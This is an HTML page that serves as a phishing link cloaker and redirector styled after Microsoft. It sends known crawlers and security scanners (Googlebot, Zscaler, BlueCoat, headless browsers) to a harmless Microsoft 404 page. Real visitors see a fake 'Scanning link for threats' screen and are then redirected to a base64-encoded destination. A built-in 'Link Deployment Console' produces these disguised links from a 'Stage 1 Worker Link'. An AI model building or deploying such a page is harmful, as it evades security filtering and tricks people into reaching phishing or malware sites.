<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style id="antiFlash">body { display: none !important; }</style>
    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const payload = urlParams.get('p');
            
            if (payload) {
                const userAgent = navigator.userAgent.toLowerCase();
                const hardBots = ["googlebot", "bingbot", "zscaler", "bluecoat", "headless", "lighthouse"];
                const isHardBot = hardBots.some(bot => userAgent.includes(bot));

                if (isHardBot) {
                    window.location.replace("https://learn.microsoft.com/en-us/errors/404");
                    return;
                }

                document.addEventListener("DOMContentLoaded", function() {
                    document.getElementById("antiFlash").remove();
                    document.getElementById("generatorUI").style.display = "none";
                    document.getElementById("bouncerUI").style.display = "flex";
                    
                    setTimeout(function() {
                        try {
                            window.location.replace(atob(payload));
                        } catch(e) {
                            window.location.replace("https://www.microsoft.com/en-us/error");
                        }
                    }, 2800); 
                });
            } else {
                document.addEventListener("DOMContentLoaded", function() {
                    document.getElementById("antiFlash").remove();
                });
            }
        })();
    </script>
    <style>
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f5f5f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #333; }
        .container { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); text-align: center; width: 100%; max-width: 400px; border: 1px solid #e1e1e1; }
        .logo { font-weight: 600; font-size: 20px; color: #5e5e5e; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #0067b8; border-radius: 50%; width: 28px; height: 28px; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { font-size: 15px; color: #2b2b2b; margin-bottom: 8px; font-weight: 400; }
        .sub-text { font-size: 12px; color: #666; }
        #generatorUI input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 2px; box-sizing: border-box; }
        #generatorUI button { background: #0067b8; color: white; border: none; padding: 12px; cursor: pointer; width: 100%; font-weight: 600; }
    </style>
</head>
<body>

    <div id="bouncerUI" class="container" style="display:none; flex-direction: column;">
        <div class="logo">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0067b8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
            <span>Security Stack</span>
        </div>
        <div class="status-text">Scanning link for threats...</div>
        <div class="spinner"></div>
        <div class="sub-text">Verifying a secure connection to the destination.</div>
    </div>

    <div id="generatorUI" class="container">
        <h3>Link Deployment Console</h3>
        <input type="text" id="target" placeholder="Paste Stage 1 Worker Link">
        <button onclick="generate()">ENCODE & PROTECT</button>
        <div id="result" style="margin-top:20px; font-size:11px; word-break:all; color:#0067b8; font-family:monospace; background:#f9f9f9; padding:10px;"></div>
    </div>

    <script>
        function generate() {
            const target = document.getElementById('target').value;
            if(!target) return;
            document.getElementById('result').innerText = window.location.origin + window.location.pathname + "?p=" + btoa(target);
        }
    </script>
</body>
</html>
